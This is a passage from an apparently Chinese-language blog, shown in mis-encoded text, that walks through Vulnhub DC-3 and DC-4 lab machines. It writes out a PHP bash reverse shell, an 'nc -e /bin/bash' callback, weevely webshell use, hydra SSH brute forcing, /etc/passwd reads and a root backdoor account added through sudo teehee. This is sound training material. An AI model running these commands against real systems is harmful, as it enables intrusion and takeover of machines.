<h3 id="æ³•2"><a href="#æ³•2" class="headerlink" title="æ³•2"></a>æ³•2</h3><h4 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a><strong>åå¼¹shell</strong></h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOCKERFILE"><figure class="iseeu highlight /dockerfile"><table><tr><td class="code"><pre><span class="line">åå¼¹<span class="keyword">shell</span><span class="language-bash">ï¼Œå°±æ˜¯æ§åˆ¶ç«¯ç›‘å¬åœ¨æŸTCP/UDPç«¯å£ï¼Œè¢«æ§ç«¯å‘èµ·è¯·æ±‚åˆ°è¯¥ç«¯å£ï¼Œå¹¶å°†å…¶å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æ§åˆ¶ç«¯ã€‚</span></span><br><span class="line"></span><br><span class="line">é€šä¿—ç‚¹è¯´ï¼Œåå¼¹<span class="keyword">shell</span><span class="language-bash">å°±æ˜¯ä¸€ç§åå‘é“¾æ¥ï¼Œä¸æ­£å‘çš„sshç­‰ä¸åŒï¼Œå®ƒæ˜¯åœ¨å¯¹æ–¹ç”µè„‘æ‰§è¡Œå‘½ä»¤è¿æ¥åˆ°æˆ‘æ–¹çš„æ”»å‡»æ¨¡å¼ï¼Œå¹¶ä¸”è¿™ç§æ”»å‡»æ¨¡å¼å¿…é¡»æ­é…è¿œç¨‹æ‰§è¡Œå‘½ä»¤æ¼æ´æ¥ä½¿ç”¨ã€‚</span></span><br><span class="line"></span><br><span class="line">ç”±äºé˜²ç«å¢™ç­‰é™åˆ¶ï¼Œå¯¹æ–¹æœºå™¨åªèƒ½å‘é€è¯·æ±‚ï¼Œä¸èƒ½æ¥æ”¶è¯·æ±‚</span><br><span class="line"></span><br><span class="line">å¯¹äºç—…æ¯’ï¼Œæœ¨é©¬ï¼Œå—å®³è€…ä»€ä¹ˆæ—¶å€™èƒ½ä¸­æ‹›ï¼Œå¯¹æ–¹çš„ç½‘ç»œç¯å¢ƒæ˜¯ä»€ä¹ˆæ ·çš„ï¼Œä»€ä¹ˆæ—¶å€™å¼€å…³æœºï¼Œéƒ½æ˜¯æœªçŸ¥ï¼Œå»ºç«‹ä¸€ä¸ªæœåŠ¡ç«¯ï¼Œè®©æ¶æ„ç¨‹åºä¸»åŠ¨è¿æ¥ï¼Œæ‰æ˜¯ä¸Šç­–ã€‚</span><br></pre></td></tr></table></figure></div>

<p>å’Œæ³•ä¸€ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦å†™ä¸€ä¸ªåå¼¹shellçš„phpæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.133.140/8888 0&gt;&amp;1&#x27;&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ³¨æ„è¿™é‡Œçš„ipä¸ºkaliçš„ipï¼Œ8888ä¸ºç›‘å¬çš„ç«¯å£</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904115013063.png" alt="image-20220904115013063"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥nc -lnvp <span class="number">8888</span>å¼€å§‹ç›‘å¬</span><br><span class="line">ç„¶åè®¿é—®<span class="number">456</span>.php</span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">456</span>.php</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904130847588.png" alt="image-20220904130847588"></p>
<p>æ‹¿åˆ°shellï¼Œåé¢ææƒå’Œæ³•ä¸€</p>
<p>ä¸€æ ·</p>
<h3 id="æ³•3"><a href="#æ³•3" class="headerlink" title="æ³•3"></a>æ³•3</h3><h4 id="weevelyã€ææƒæ²¡å›æ˜¾ã€‘"><a href="#weevelyã€ææƒæ²¡å›æ˜¾ã€‘" class="headerlink" title="weevelyã€ææƒæ²¡å›æ˜¾ã€‘"></a><strong>weevely</strong>ã€ææƒæ²¡å›æ˜¾ã€‘</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">Weevelyæ˜¯ä¸€æ¬¾ä½¿ç”¨pythonç¼–å†™çš„webshellå·¥å…·,é›†webshellç”Ÿæˆå’Œè¿æ¥äºä¸€èº«,é‡‡ç”¨c/sæ¨¡å¼ æ„å»º,å¯ä»¥ç®—ä½œæ˜¯linuxä¸‹çš„ä¸€æ¬¾phpèœåˆ€æ›¿ä»£å·¥å…·</span><br></pre></td></tr></table></figure></div>

<p>ç”ŸæˆShell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VERILOG"><figure class="iseeu highlight /verilog"><table><tr><td class="code"><pre><span class="line">weevely <span class="keyword">generate</span>  &lt;æ–‡ä»¶å&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">weevely <span class="keyword">generate</span> <span class="number">123456</span> shell<span class="variable">.php</span></span><br></pre></td></tr></table></figure></div>

<p>æŠŠç”Ÿæˆçš„å†…å®¹ï¼Œå¤åˆ¶åˆ°æˆ‘ä»¬åˆ›å»ºçš„<code>789.php</code>æ–‡ä»¶é‡Œï¼Œå’Œå‰é¢ä¸¤ä¸ªæ–¹æ³•æ­¥éª¤ä¸€æ ·</p>
<p>åˆ©ç”¨è§¦å‘shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">weevely</span> http://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">789</span>.php <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">python</span> -m http.server <span class="number">9999</span>   </span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220904133118746.png" alt="image-20220904133118746"></p>
<p>æˆåŠŸè¿›å…¥shell</p>
<p>ä½†æ˜¯å½“æ‰§è¡Œææƒæ—¶</p>
<p><img src="/2022/08/29/vulnhub/image-20220904135935922.png" alt="image-20220904135935922"></p>
<p>æŠ¥é”™æ— æ³•ææƒï¼Œçœ‹æ¥æ˜¯è¢«è¿‡æ»¤å•¥çš„</p>
<hr>
<h1 id="å››ã€DC-4-åˆçº§-ä¸­çº§"><a href="#å››ã€DC-4-åˆçº§-ä¸­çº§" class="headerlink" title="å››ã€DC-4[åˆçº§/ä¸­çº§]"></a>å››ã€DC-4[åˆçº§/ä¸­çº§]</h1><p><strong>only one flag</strong></p>
<p>å…ˆçœ‹çœ‹é¶æœºç«¯å£è¿è¡Œçš„æœåŠ¡</p>
<p><img src="/2022/08/29/vulnhub/image-20220918190610478.png" alt="image-20220918190610478"></p>
<p>å‘ç°æœ‰22å’Œ80ç«¯å£ï¼Œåˆ†åˆ«è¿è¡Œsshå’Œhttp</p>
<p>æˆ‘ä»¬å…ˆè®¿é—®80ç«¯å£</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARMASM"><figure class="iseeu highlight /armasm"><table><tr><td class="code"><pre><span class="line">è®¿é—®<span class="built_in">ip</span>ï¼š<span class="number">192</span>.<span class="number">168</span>.<span class="number">133</span>.<span class="number">141</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918190945726.png" alt="image-20220918190945726"></p>
<p>æ˜¯ä¸€ä¸ªåŸºæœ¬çš„ç™»å½•çª—å£ï¼Œæœ‰æç¤ºæ˜¯adminç”¨æˆ·ç™»å½•ç•Œé¢ï¼Œæ‰€ä»¥<strong>å¯èƒ½éœ€è¦å¯†ç çˆ†ç ´ç™»å½•</strong></p>
<p>æˆ‘ä»¬å†åˆ©ç”¨<code>wappalyzer</code>çœ‹ä¸€ä¸‹ç½‘ç«™ä¸€äº›åŸºæœ¬ä¿¡æ¯</p>
<p><img src="/2022/08/29/vulnhub/image-20220918194402321.png" alt="image-20220918194402321"></p>
<p>æ²¡æœ‰å•¥æœ‰ç”¨çš„ä¿¡æ¯</p>
<h2 id="å¯†ç çˆ†ç ´"><a href="#å¯†ç çˆ†ç ´" class="headerlink" title="å¯†ç çˆ†ç ´"></a>å¯†ç çˆ†ç ´</h2><p>ç„¶åæˆ‘ä»¬å°±å¼€å§‹è¿›è¡Œå¯†ç çˆ†ç ´</p>
<p>å·²çŸ¥ç”¨æˆ·åä¸ºadminï¼Œåªç”¨å¯¹å¯†ç çˆ†ç ´</p>
<p><img src="/2022/08/29/vulnhub/image-20220918202233098.png" alt="image-20220918202233098"></p>
<p>ã€å­—å…¸å¯ä»¥è‡ªå·±æ‰¾ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥çœ‹æˆ‘å­¦ä¹ ç¬”è®°å†™çš„ç½‘ç«™ä¸‹è½½ã€‘</p>
<p>è¿™é‡Œæˆ‘ç”¨çš„<code>top2000.txt</code></p>
<p>æœ€åçˆ†ç ´å‡ºå¯†ç ä¸º<code>happy</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220918203225520.png" alt="image-20220918203225520"></p>
<p>ç™»å½•è¯•è¯•</p>
<p><img src="/2022/08/29/vulnhub/image-20220918204147349.png" alt="image-20220918204147349"></p>
<p>ç™»å½•æˆåŠŸï¼Œè¿›å…¥<code>Command</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220918204230810.png" alt="image-20220918204230810"></p>
<p>ç‚¹å‡»runï¼Œå°±ä¼šæ˜¾ç¤ºä¸Šé¢çš„æ•°æ®ï¼Œçœ‹æ¥æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯å®ƒé»˜è®¤æ˜¯<code>ls -l</code>ï¼Œæˆ‘ä»¬è¯•è¯•æŠ“åŒ…èƒ½ä¿®æ”¹è¯·æ±‚åŒ…é‡Œçš„å‘½ä»¤å—</p>
<p><img src="/2022/08/29/vulnhub/image-20220918204413877.png" alt="image-20220918204413877"></p>
<p>å‘ç°æ˜¯å¯ä»¥ä¿®æ”¹çš„ï¼Œæˆ‘ä»¬è¯•è¯•<code>whoami</code>å‘½ä»¤ï¼Œçœ‹çœ‹å½“å‰ç½‘ç«™ç™»å½•ç”¨æˆ·æƒé™</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">whoami</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918204514149.png" alt="image-20220918204514149"></p>
<p>å‘ç°æ˜¯æ™®é€šç”¨æˆ·æƒé™</p>
<p>ä¸‹é¢æ˜¯ä¸¤ä¸ª<code>getshell</code>çš„æ€è·¯</p>
<hr>
<p><strong>1.</strong></p>
<p>åç»­æŸ¥è¯¢æ“ä½œï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥åˆ©ç”¨<code>nc</code><strong>åå¼¹shell</strong>ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥æ‰¾åˆ°ç”¨æˆ·ç›®å½•ä¿¡æ¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">ç»ˆç«¯è¾“å…¥nc -l -vv -<span class="selector-tag">p</span> <span class="number">8888</span>ï¼Œç›‘å¬<span class="number">8888</span>ç«¯å£</span><br></pre></td></tr></table></figure></div>

<p>æŠ“åŒ…æ•°æ®å‘½ä»¤ä¿®æ”¹ä¸º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">nc -nv <span class="number">192.168</span>.<span class="number">133.140</span> <span class="number">8888</span> -e <span class="regexp">/bin/</span>bash   <span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.140</span>æ˜¯è™šæ‹Ÿæœºipï¼Œä¸æ˜¯é¶æœºip</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åç»ˆç«¯å°±å¯ä»¥æ‰§è¡Œåç»­æ‰§è¡Œå‘½ä»¤çš„ç±»ä¼¼æ“ä½œï¼Œå°±æ˜¯æ‰§è¡Œçš„æ—¶å€™å¯èƒ½ç¨å¾®æ–¹ä¾¿ä¸€äº›</p>
<hr>
<p><strong>2.</strong></p>
<p>æˆ‘ä»¬ä¿®æ”¹å‘½ä»¤ï¼ŒæŸ¥è¯¢<code>/etc/passwd</code>æ–‡æ¡£ï¼ˆè®°å½•æ¯ä¸ªç”¨æˆ·çš„ä¿¡æ¯ï¼Œæ–¹ä¾¿ç®¡ç†å‘˜å¯¹ç”¨æˆ·çš„ç®¡ç†çš„ä¸€ä¸ªæ–‡æ¡£ï¼‰</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">è¾“å…¥cat+<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918205535912.png" alt="image-20220918205535912"></p>
<p>å‘ç°æœ‰ä¸‰ä¸ªç”¨æˆ·</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">charles</span></span><br><span class="line"><span class="attribute">jim</span></span><br><span class="line"><span class="attribute">sam</span></span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬æŸ¥çœ‹è¿™å‡ ä¸ªç”¨æˆ·çš„ç›®å½•ä¸‹æœ‰æ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯</p>
<p>å…ˆè®¿é—®<code>charles</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ls+-a+<span class="regexp">/home/</span>charles</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918211049263.png" alt="image-20220918211049263"></p>
<p>æ„Ÿè§‰æ²¡å•¥æœ‰ç”¨çš„ä¿¡æ¯</p>
<p>å†çœ‹çœ‹<code>jim</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ls+-a+<span class="regexp">/home/</span>jim</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918211159526.png" alt="image-20220918211159526"></p>
<p>å‘ç°å…³é”®ä¿¡æ¯ï¼Œ <code>backups</code>ç›®å½•å’Œ<code>mbox</code>ç›®å½•ï¼Œ<code>test.sh</code>é‡Œé¢æˆ‘çœ‹äº†ï¼Œæ²¡å•¥æœ‰ç”¨çš„ä¿¡æ¯</p>
<p>å…ˆçœ‹<code>backups</code>ç›®å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ls+-a+<span class="regexp">/home/</span>jim/backups</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918211855793.png" alt="image-20220918211855793"></p>
<p>å‘ç°æœ‰ä¸ª<code>old-passwords.bak</code>ï¼Œè¿™ä¸ªå¯èƒ½å°±æ˜¯ç™»å½•è¿™ä¸‰ä¸ªç”¨æˆ·çš„å…³é”®</p>
<p>æŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">è¾“å…¥cat+<span class="regexp">/home/</span>jim/old-passwords.bak</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918212107439.png" alt="image-20220918212107439"></p>
<p>å‘ç°æ˜¯ä¸€ä¸ªå¯†ç è¡¨ï¼Œå¤åˆ¶åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå½“ä½œçˆ†ç ´çš„å¯†ç è¡¨</p>
<h2 id="hydraå¯¹ä¸‰ç”¨æˆ·è¿›è¡Œsshçˆ†ç ´"><a href="#hydraå¯¹ä¸‰ç”¨æˆ·è¿›è¡Œsshçˆ†ç ´" class="headerlink" title="hydraå¯¹ä¸‰ç”¨æˆ·è¿›è¡Œsshçˆ†ç ´"></a>hydraå¯¹ä¸‰ç”¨æˆ·è¿›è¡Œsshçˆ†ç ´</h2><p>æˆ‘ä»¬å·²ç»æœ‰äº†å¯†ç è¡¨<code>ï¼ˆpd.txtï¼‰</code>,æˆ‘ä»¬å†æŠŠä¸‰ä¸ªç”¨æˆ·åå†™åˆ°å¦ä¸€ä¸ªæ–‡æ¡£é‡Œ<code>ï¼ˆun.txtï¼‰</code></p>
<p>å› ä¸ºä¹‹å‰æˆ‘ä»¬æ‰«æçŸ¥é“ï¼Œ<code>22</code>ç«¯å£è¿è¡Œç€<code>ssh</code>ï¼Œè€Œ<code>80</code>ç«¯å£æˆ‘ä»¬å·²ç»è®¿é—®äº†ï¼Œæ‰€ä»¥ä¸‹é¢ç«¯å£å†™<code>22</code></p>
<p>äºæ˜¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">è¾“å…¥hydra -L un<span class="selector-class">.txt</span> -P pd<span class="selector-class">.txt</span> <span class="number">192.168</span>.<span class="number">133.141</span> ssh -s <span class="number">22</span></span><br></pre></td></tr></table></figure></div>

<p>æœ‰ç‚¹ä¹…ï¼Œç­‰ä¸€ä¼šå°±è¡Œ</p>
<p><img src="/2022/08/29/vulnhub/image-20220918214254623.png" alt="image-20220918214254623"></p>
<p>å¾—åˆ°<code>jim</code>ç”¨æˆ·çš„å¯†ç </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">jibril04</span><br></pre></td></tr></table></figure>



<p>ç„¶åæˆ‘ä»¬ç™»å½•ssh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">è¾“å…¥ssh <span class="symbol">jim@</span><span class="number">192.168</span><span class="number">.133</span><span class="number">.141</span> -p <span class="number">22</span></span><br></pre></td></tr></table></figure></div>

<p>ç„¶åè¾“å…¥å¯†ç åï¼Œç™»å½•æˆåŠŸ</p>
<p><img src="/2022/08/29/vulnhub/image-20220918214519470.png" alt="image-20220918214519470"></p>
<p>æˆ‘ä»¬å…ˆçœ‹çœ‹æˆ‘ä»¬èƒ½å¦æ‰§è¡Œä¸€äº›ç®¡ç†å‘˜å‘½ä»¤</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">è¾“å…¥sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220918215754640.png" alt="image-20220918215754640"></p>
<p>å‘ç°<code>jim</code>ç”¨æˆ·ä¸èƒ½æ‰§è¡Œä»»ä½•ç®¡ç†å‘˜å‘½ä»¤ï¼Œæ‰€ä»¥ä¸å¯èƒ½åœ¨<code>jim</code>ç”¨æˆ·ä¸Šè¿›è¡Œææƒæˆ–å…¶ä»–åç»­æ“ä½œ</p>
<p>æˆ‘ä»¬ä»”ç»†ä¸€äº›å¯ä»¥çœ‹åˆ°</p>
<p><img src="/2022/08/29/vulnhub/image-20220918214603182.png" alt="image-20220918214603182"></p>
<p>è¯´æˆ‘ä»¬æœ‰ä¸€å°é‚®ä»¶ï¼Œé‚£æˆ‘ä»¬å°±çœ‹çœ‹è¿™å°ç”¨é‚®ä»¶æ˜¯ä»€ä¹ˆ</p>
<p>ä½†æˆ‘ä»¬ä¸çŸ¥é“<code>mail</code>åœ¨å“ªé‡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">find</span> / -name mail</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918215012745.png" alt="image-20220918215012745"></p>
<p>æ‰¾åˆ°ä½ç½®<code>/var/mail</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cd</span> /var/mail;<span class="built_in">ls</span> -a</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918215052934.png" alt="image-20220918215052934"></p>
<p>å‘ç°æœ‰ä¸€å°åä¸º<code>jim</code>çš„é‚®ä»¶ï¼ŒæŸ¥çœ‹ä¿¡æ¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cat</span> jim</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918215204901.png" alt="image-20220918215204901"></p>
<p>å‘ç°æ˜¯<code>charles</code>å‘ç»™<code>jim</code>çš„é‚®ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I&#x27;m heading off <span class="keyword">on</span> holidays <span class="keyword">at</span> <span class="keyword">the</span> <span class="keyword">end</span> <span class="keyword">of</span> today, so <span class="keyword">the</span> boss asked <span class="keyword">me</span> <span class="keyword">to</span> give you <span class="keyword">my</span> password just <span class="keyword">in</span> case anything goes wrong.</span><br><span class="line"></span><br><span class="line">Password <span class="keyword">is</span>:  ^xHhA&amp;hvim0y</span><br><span class="line"></span><br><span class="line">See ya,</span><br><span class="line">Charles</span><br><span class="line"></span><br><span class="line">ç¿»è¯‘ï¼š</span><br><span class="line">å—¨ï¼Œå‰å§†ï¼Œ</span><br><span class="line"></span><br><span class="line">æˆ‘ä»Šå¤©å¹´åº•è¦æ”¾å‡ï¼Œæ‰€ä»¥è€æ¿è®©æˆ‘æŠŠå¯†ç ç»™ä½ ï¼Œä»¥é˜²ä¸‡ä¸€ã€‚</span><br><span class="line"></span><br><span class="line">å¯†ç æ˜¯ï¼š^xHhA&amp;hvim0y</span><br><span class="line"></span><br><span class="line">å†è§ï¼Œ</span><br><span class="line">æŸ¥å°”æ–¯</span><br></pre></td></tr></table></figure></div>

<p>ä¿¡é‡Œæåˆ°ä»–è‡ªå·±çš„å¯†ç </p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">^xHhA<span class="meta">&amp;hvim0y</span></span><br></pre></td></tr></table></figure>

<p>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥ç™»å½•<code>charles</code>çš„è´¦å·ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ‡æ¢ç”¨æˆ·</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">è¾“å…¥<span class="keyword">su</span> charles</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åè¾“å…¥å¯†ç åï¼Œç™»å½•æˆåŠŸ</p>
<p><img src="/2022/08/29/vulnhub/image-20220918215532470.png" alt="image-20220918215532470"></p>
<p>å…ˆçœ‹çœ‹<code>charles</code>èƒ½æ‰§è¡Œä»€ä¹ˆç®¡ç†å‘˜å‘½ä»¤</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">è¾“å…¥sudo -l</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220918220005178.png" alt="image-20220918220005178"></p>
<p>å‘ç°<code>charles</code>å¯ä»¥æ‰§è¡Œç®¡ç†å‘˜çš„<code>teehee</code>å‘½ä»¤</p>
<h2 id="teehee"><a href="#teehee" class="headerlink" title="teehee"></a>teehee</h2><p>æˆ‘ä»¬å…ˆéœ€è¦çŸ¥é“è¿™ä¸ªå‘½ä»¤æ˜¯å¹²ä»€ä¹ˆçš„</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">è¾“å…¥teehee -h</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220918220336958.png" alt="image-20220918220336958"></p>
<p><u><strong>å‘ç°å®ƒæ˜¯å¯ä»¥ä¿®æ”¹æ–‡ä»¶çš„æ•°æ®ï¼Œ-aæŒ‡ä»¤èƒ½å¤Ÿä¿è¯ä¿®æ”¹æ–‡ä»¶ä¸ä¼šè¦†ç›–åŸæœ‰æ–‡ä»¶</strong></u></p>
<p>é‚£æˆ‘ä»¬éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œå°±å¯ä»¥åœ¨<code>/etc/passwd</code>é‡Œé¢æ·»åŠ ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·æ•°æ®</p>
<h3 id="æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·"><a href="#æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·" class="headerlink" title="æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·"></a>æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">è¾“å…¥sudo teehee -a <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918221258918.png" alt="image-20220918221258918"></p>
<p>ç„¶åå°±ç­‰å¾…æˆ‘ä»¬è¾“å…¥æ•°æ®</p>
<p><img src="/2022/08/29/vulnhub/image-20220918220824224.png" alt="image-20220918220824224"></p>
<p>æŒ‰ç…§<code>root</code>ç”¨æˆ·æ ¼å¼ï¼Œæˆ‘ä»¬æ·»åŠ è‡ªå·±çš„æ•°æ®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">è¾“å…¥</span><br><span class="line"><span class="symbol">ttoc:</span>(è¿™é‡Œæ˜¯å¯†ç ï¼Œå¯ä»¥åŠ å…¥è‡ªå·±çš„å“ˆå¸Œåçš„å¯†ç ï¼Œå½“ç„¶ä¸åŠ å°±å¯ä»¥ç›´æ¥ç™»å½•ï¼Œè¿™é‡Œæˆ‘ä¸åŠ ï¼Œå¿½ç•¥)<span class="symbol">:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220918221714606.png" alt="image-20220918221714606"></p>
<p>æ·»åŠ æˆåŠŸï¼Œæˆ‘ä»¬å†çœ‹çœ‹èƒ½ä¸èƒ½ç™»å½•ï¼Œæ˜¯ä¸æ˜¯ç®¡ç†å‘˜</p>
<p><img src="/2022/08/29/vulnhub/image-20220918221800576.png" alt="image-20220918221800576"></p>
<p>å‘ç°æ˜¯ç®¡ç†å‘˜ï¼Œç›´æ¥åˆ°<code>root</code>ç›®å½•ä¸‹ï¼ŒæŸ¥çœ‹ <code>flag</code>å³å¯</p>
<p><img src="/2022/08/29/vulnhub/image-20220918221943297.png" alt="image-20220918221943297"></p>
